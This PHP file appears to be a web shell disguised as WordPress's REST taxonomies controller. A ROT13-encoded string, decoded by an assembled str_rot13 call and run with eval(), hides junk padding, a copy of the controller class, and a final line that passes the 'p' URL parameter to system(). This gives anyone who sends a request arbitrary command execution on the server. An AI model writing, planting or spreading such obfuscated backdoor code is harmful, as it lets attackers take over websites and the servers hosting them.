<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Gnkbabzvrf_Pbagebyyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 4.7.0
 */

/**
 * Pber pynff hfrq gb znantr gnkbabzvrf ivn gur ERFG NCV.
 *
 * @fvapr 4.7.0
 *
 * @frr JC_ERFG_Pbagebyyre
 */
pynff JC_ERFG_Gnkbabzvrf_Pbagebyyre rkgraqf JC_ERFG_Pbagebyyre {

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 4.7.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->anzrfcnpr = 'jc/i2';
		$guvf->erfg_onfr = 'gnkbabzvrf';
	}

	/**
	 * Ertvfgref gur ebhgrf sbe gnkbabzvrf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @frr ertvfgre_erfg_ebhgr()
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr,
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrzf' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrzf_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_pbyyrpgvba_cnenzf(),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr . '/(?C<gnkbabzl>[\j-]+)',
			neenl(
				'netf'   => neenl(
					'gnkbabzl' => neenl(
						'qrfpevcgvba' => __( 'Na nycunahzrevp vqragvsvre sbe gur gnkbabzl.' ),
						'glcr'        => 'fgevat',
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrz_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'pbagrkg' => $guvf->trg_pbagrkg_cnenz( neenl( 'qrsnhyg' => 'ivrj' ) ),
					),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);
	}

	/**
	 * Purpxf jurgure n tvira erdhrfg unf crezvffvba gb ernq gnkbabzvrf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrzf_crezvffvbaf_purpx( $erdhrfg ) {
		vs ( 'rqvg' === $erdhrfg['pbagrkg'] ) {
			vs ( ! rzcgl( $erdhrfg['glcr'] ) ) {
				$gnkbabzvrf = trg_bowrpg_gnkbabzvrf( $erdhrfg['glcr'], 'bowrpgf' );
			} ryfr {
				$gnkbabzvrf = trg_gnkbabzvrf( '', 'bowrpgf' );
			}

			sbernpu ( $gnkbabzvrf nf $gnkbabzl ) {
				vs ( ! rzcgl( $gnkbabzl->fubj_va_erfg ) && pheerag_hfre_pna( $gnkbabzl->pnc->nffvta_grezf ) ) {
					erghea gehr;
				}
			}

			erghea arj JC_Reebe(
				'erfg_pnaabg_ivrj',
				__( 'Fbeel, lbh ner abg nyybjrq gb znantr grezf va guvf gnkbabzl.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea gehr;
	}

	/**
	 * Ergevrirf nyy choyvp gnkbabzvrf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrzf( $erdhrfg ) {
		vs ( $erdhrfg->vf_zrgubq( 'URNQ' ) ) {
			// Erghea rneyl nf guvf unaqyre qbrfa'g nqq nal erfcbafr urnqref.
			erghea arj JC_ERFG_Erfcbafr( neenl() );
		}

		// Ergevrir gur yvfg bs ertvfgrerq pbyyrpgvba dhrel cnenzrgref.
		$ertvfgrerq = $guvf->trg_pbyyrpgvba_cnenzf();

		vs ( vffrg( $ertvfgrerq['glcr'] ) && ! rzcgl( $erdhrfg['glcr'] ) ) {
			$gnkbabzvrf = trg_bowrpg_gnkbabzvrf( $erdhrfg['glcr'], 'bowrpgf' );
		} ryfr {
			$gnkbabzvrf = trg_gnkbabzvrf( '', 'bowrpgf' );
		}

		$qngn = neenl();

		sbernpu ( $gnkbabzvrf nf $gnk_glcr => $inyhr ) {
			vs ( rzcgl( $inyhr->fubj_va_erfg ) || ( 'rqvg' === $erdhrfg['pbagrkg'] && ! pheerag_hfre_pna( $inyhr->pnc->nffvta_grezf ) ) ) {
				pbagvahr;
			}

			$gnk               = $guvf->cercner_vgrz_sbe_erfcbafr( $inyhr, $erdhrfg );
			$gnk               = $guvf->cercner_erfcbafr_sbe_pbyyrpgvba( $gnk );
			$qngn[ $gnk_glcr ] = $gnk;
		}

		vs ( rzcgl( $qngn ) ) {
			// Erfcbafr fubhyq fgvyy or erghearq nf n WFBA bowrpg jura vg vf rzcgl.
			$qngn = (bowrpg) $qngn;
		}

		erghea erfg_rafher_erfcbafr( $qngn );
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb n gnkbabzl.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea obby|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff sbe gur vgrz, bgurejvfr snyfr be JC_Reebe bowrpg.
	 */
	choyvp shapgvba trg_vgrz_crezvffvbaf_purpx( $erdhrfg ) {

		$gnk_bow = trg_gnkbabzl( $erdhrfg['gnkbabzl'] );

		vs ( $gnk_bow ) {
			vs ( rzcgl( $gnk_bow->fubj_va_erfg ) ) {
				erghea snyfr;
			}

			vs ( 'rqvg' === $erdhrfg['pbagrkg'] && ! pheerag_hfre_pna( $gnk_bow->pnc->nffvta_grezf ) ) {
				erghea arj JC_Reebe(
					'erfg_sbeovqqra_pbagrkg',
					__( 'Fbeel, lbh ner abg nyybjrq gb znantr grezf va guvf gnkbabzl.' ),
					neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
				);
			}
		}

		erghea gehr;
	}

	/**
	 * Ergevrirf n fcrpvsvp gnkbabzl.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrz( $erdhrfg ) {
		$gnk_bow = trg_gnkbabzl( $erdhrfg['gnkbabzl'] );

		vs ( rzcgl( $gnk_bow ) ) {
			erghea arj JC_Reebe(
				'erfg_gnkbabzl_vainyvq',
				__( 'Vainyvq gnkbabzl.' ),
				neenl( 'fgnghf' => 404 )
			);
		}

		$qngn = $guvf->cercner_vgrz_sbe_erfcbafr( $gnk_bow, $erdhrfg );

		erghea erfg_rafher_erfcbafr( $qngn );
	}

	/**
	 * Cercnerf n gnkbabzl bowrpg sbe frevnyvmngvba.
	 *
	 * @fvapr 4.7.0
	 * @fvapr 5.9.0 Eranzrq `$gnkbabzl` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz JC_Gnkbabzl     $vgrz    Gnkbabzl qngn.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr Erfcbafr bowrpg.
	 */
	choyvp shapgvba cercner_vgrz_sbe_erfcbafr( $vgrz, $erdhrfg ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$gnkbabzl = $vgrz;

		// Qba'g cercner gur erfcbafr obql sbe URNQ erdhrfgf.
		vs ( $erdhrfg->vf_zrgubq( 'URNQ' ) ) {
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-gnkbabzvrf-pbagebyyre.cuc */
			erghea nccyl_svygref( 'erfg_cercner_gnkbabzl', arj JC_ERFG_Erfcbafr( neenl() ), $gnkbabzl, $erdhrfg );
		}

		$onfr = ! rzcgl( $gnkbabzl->erfg_onfr ) ? $gnkbabzl->erfg_onfr : $gnkbabzl->anzr;

		$svryqf = $guvf->trg_svryqf_sbe_erfcbafr( $erdhrfg );
		$qngn   = neenl();

		vs ( va_neenl( 'anzr', $svryqf, gehr ) ) {
			$qngn['anzr'] = $gnkbabzl->ynory;
		}

		vs ( va_neenl( 'fyht', $svryqf, gehr ) ) {
			$qngn['fyht'] = $gnkbabzl->anzr;
		}

		vs ( va_neenl( 'pncnovyvgvrf', $svryqf, gehr ) ) {
			$qngn['pncnovyvgvrf'] = $gnkbabzl->pnc;
		}

		vs ( va_neenl( 'qrfpevcgvba', $svryqf, gehr ) ) {
			$qngn['qrfpevcgvba'] = $gnkbabzl->qrfpevcgvba;
		}

		vs ( va_neenl( 'ynoryf', $svryqf, gehr ) ) {
			$qngn['ynoryf'] = $gnkbabzl->ynoryf;
		}

		vs ( va_neenl( 'glcrf', $svryqf, gehr ) ) {
			$qngn['glcrf'] = neenl_inyhrf( $gnkbabzl->bowrpg_glcr );
		}

		vs ( va_neenl( 'fubj_pybhq', $svryqf, gehr ) ) {
			$qngn['fubj_pybhq'] = $gnkbabzl->fubj_gntpybhq;
		}

		vs ( va_neenl( 'uvrenepuvpny', $svryqf, gehr ) ) {
			$qngn['uvrenepuvpny'] = $gnkbabzl->uvrenepuvpny;
		}

		vs ( va_neenl( 'erfg_onfr', $svryqf, gehr ) ) {
			$qngn['erfg_onfr'] = $onfr;
		}

		vs ( va_neenl( 'erfg_anzrfcnpr', $svryqf, gehr ) ) {
			$qngn['erfg_anzrfcnpr'] = $gnkbabzl->erfg_anzrfcnpr;
		}

		vs ( va_neenl( 'ivfvovyvgl', $svryqf, gehr ) ) {
			$qngn['ivfvovyvgl'] = neenl(
				'choyvp'             => (obby) $gnkbabzl->choyvp,
				'choyvpyl_dhrelnoyr' => (obby) $gnkbabzl->choyvpyl_dhrelnoyr,
				'fubj_nqzva_pbyhza'  => (obby) $gnkbabzl->fubj_nqzva_pbyhza,
				'fubj_va_ani_zrahf'  => (obby) $gnkbabzl->fubj_va_ani_zrahf,
				'fubj_va_dhvpx_rqvg' => (obby) $gnkbabzl->fubj_va_dhvpx_rqvg,
				'fubj_hv'            => (obby) $gnkbabzl->fubj_hv,
			);
		}

		$pbagrkg = ! rzcgl( $erdhrfg['pbagrkg'] ) ? $erdhrfg['pbagrkg'] : 'ivrj';
		$qngn    = $guvf->nqq_nqqvgvbany_svryqf_gb_bowrpg( $qngn, $erdhrfg );
		$qngn    = $guvf->svygre_erfcbafr_ol_pbagrkg( $qngn, $pbagrkg );

		// Jenc gur qngn va n erfcbafr bowrpg.
		$erfcbafr = erfg_rafher_erfcbafr( $qngn );

		vs ( erfg_vf_svryq_vapyhqrq( '_yvaxf', $svryqf ) || erfg_vf_svryq_vapyhqrq( '_rzorqqrq', $svryqf ) ) {
			$erfcbafr->nqq_yvaxf( $guvf->cercner_yvaxf( $gnkbabzl ) );
		}

		/**
		 * Svygref n gnkbabzl erghearq sebz gur ERFG NCV.
		 *
		 * Nyybjf zbqvsvpngvba bs gur gnkbabzl qngn evtug orsber vg vf erghearq.
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz JC_ERFG_Erfcbafr $erfcbafr Gur erfcbafr bowrpg.
		 * @cnenz JC_Gnkbabzl      $vgrz     Gur bevtvany gnkbabzl bowrpg.
		 * @cnenz JC_ERFG_Erdhrfg  $erdhrfg  Erdhrfg hfrq gb trarengr gur erfcbafr.
		 */
		erghea nccyl_svygref( 'erfg_cercner_gnkbabzl', $erfcbafr, $gnkbabzl, $erdhrfg );
	}

	/**
	 * Cercnerf yvaxf sbe gur erdhrfg.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz JC_Gnkbabzl $gnkbabzl Gur gnkbabzl.
	 * @erghea neenl Yvaxf sbe gur tvira gnkbabzl.
	 */
	cebgrpgrq shapgvba cercner_yvaxf( $gnkbabzl ) {
		erghea neenl(
			'pbyyrpgvba'              => neenl(
				'uers' => erfg_hey( fcevags( '%f/%f', $guvf->anzrfcnpr, $guvf->erfg_onfr ) ),
			),
			'uggcf://ncv.j.bet/vgrzf' => neenl(
				'uers' => erfg_hey( erfg_trg_ebhgr_sbe_gnkbabzl_vgrzf( $gnkbabzl->anzr ) ),
			),
		);
	}

	/**
	 * Ergevrirf gur gnkbabzl'f fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 4.7.0
	 * @fvapr 5.0.0 Gur `ivfvovyvgl` cebcregl jnf nqqrq.
	 * @fvapr 5.9.0 Gur `erfg_anzrfcnpr` cebcregl jnf nqqrq.
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$fpurzn = neenl(
			'$fpurzn'    => 'uggc://wfba-fpurzn.bet/qensg-04/fpurzn#',
			'gvgyr'      => 'gnkbabzl',
			'glcr'       => 'bowrpg',
			'cebcregvrf' => neenl(
				'pncnovyvgvrf'   => neenl(
					'qrfpevcgvba' => __( 'Nyy pncnovyvgvrf hfrq ol gur gnkbabzl.' ),
					'glcr'        => 'bowrpg',
					'pbagrkg'     => neenl( 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'qrfpevcgvba'    => neenl(
					'qrfpevcgvba' => __( 'N uhzna-ernqnoyr qrfpevcgvba bs gur gnkbabzl.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'uvrenepuvpny'   => neenl(
					'qrfpevcgvba' => __( 'Jurgure be abg gur gnkbabzl fubhyq unir puvyqera.' ),
					'glcr'        => 'obbyrna',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'ynoryf'         => neenl(
					'qrfpevcgvba' => __( 'Uhzna-ernqnoyr ynoryf sbe gur gnkbabzl sbe inevbhf pbagrkgf.' ),
					'glcr'        => 'bowrpg',
					'pbagrkg'     => neenl( 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'anzr'           => neenl(
					'qrfpevcgvba' => __( 'Gur gvgyr sbe gur gnkbabzl.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					'ernqbayl'    => gehr,
				),
				'fyht'           => neenl(
					'qrfpevcgvba' => __( 'Na nycunahzrevp vqragvsvre sbe gur gnkbabzl.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					'ernqbayl'    => gehr,
				),
				'fubj_pybhq'     => neenl(
					'qrfpevcgvba' => __( 'Jurgure be abg gur grez pybhq fubhyq or qvfcynlrq.' ),
					'glcr'        => 'obbyrna',
					'pbagrkg'     => neenl( 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'glcrf'          => neenl(
					'qrfpevcgvba' => __( 'Glcrf nffbpvngrq jvgu gur gnkbabzl.' ),
					'glcr'        => 'neenl',
					'vgrzf'       => neenl(
						'glcr' => 'fgevat',
					),
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'erfg_onfr'      => neenl(
					'qrfpevcgvba' => __( 'ERFG onfr ebhgr sbe gur gnkbabzl.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					'ernqbayl'    => gehr,
				),
				'erfg_anzrfcnpr' => neenl(
					'qrfpevcgvba' => __( 'ERFG anzrfcnpr ebhgr sbe gur gnkbabzl.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					'ernqbayl'    => gehr,
				),
				'ivfvovyvgl'     => neenl(
					'qrfpevcgvba' => __( 'Gur ivfvovyvgl frggvatf sbe gur gnkbabzl.' ),
					'glcr'        => 'bowrpg',
					'pbagrkg'     => neenl( 'rqvg' ),
					'ernqbayl'    => gehr,
					'cebcregvrf'  => neenl(
						'choyvp'             => neenl(
							'qrfpevcgvba' => __( 'Jurgure n gnkbabzl vf vagraqrq sbe hfr choyvpyl rvgure ivn gur nqzva vagresnpr be ol sebag-raq hfref.' ),
							'glcr'        => 'obbyrna',
						),
						'choyvpyl_dhrelnoyr' => neenl(
							'qrfpevcgvba' => __( 'Jurgure gur gnkbabzl vf choyvpyl dhrelnoyr.' ),
							'glcr'        => 'obbyrna',
						),
						'fubj_hv'            => neenl(
							'qrfpevcgvba' => __( 'Jurgure gb trarengr n qrsnhyg HV sbe znantvat guvf gnkbabzl.' ),
							'glcr'        => 'obbyrna',
						),
						'fubj_nqzva_pbyhza'  => neenl(
							'qrfpevcgvba' => __( 'Jurgure gb nyybj nhgbzngvp perngvba bs gnkbabzl pbyhzaf ba nffbpvngrq cbfg-glcrf gnoyr.' ),
							'glcr'        => 'obbyrna',
						),
						'fubj_va_ani_zrahf'  => neenl(
							'qrfpevcgvba' => __( 'Jurgure gb znxr gur gnkbabzl ninvynoyr sbe fryrpgvba va anivtngvba zrahf.' ),
							'glcr'        => 'obbyrna',
						),
						'fubj_va_dhvpx_rqvg' => neenl(
							'qrfpevcgvba' => __( 'Jurgure gb fubj gur gnkbabzl va gur dhvpx/ohyx rqvg cnary.' ),
							'glcr'        => 'obbyrna',
						),

					),
				),
			),
		);

		$guvf->fpurzn = $fpurzn;

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}

	/**
	 * Ergevrirf gur dhrel cnenzf sbe pbyyrpgvbaf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea neenl Pbyyrpgvba cnenzrgref.
	 */
	choyvp shapgvba trg_pbyyrpgvba_cnenzf() {
		$arj_cnenzf            = neenl();
		$arj_cnenzf['pbagrkg'] = $guvf->trg_pbagrkg_cnenz( neenl( 'qrsnhyg' => 'ivrj' ) );
		$arj_cnenzf['glcr']    = neenl(
			'qrfpevcgvba' => __( 'Yvzvg erfhygf gb gnkbabzvrf nffbpvngrq jvgu n fcrpvsvp cbfg glcr.' ),
			'glcr'        => 'fgevat',
		);
		erghea $arj_cnenzf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>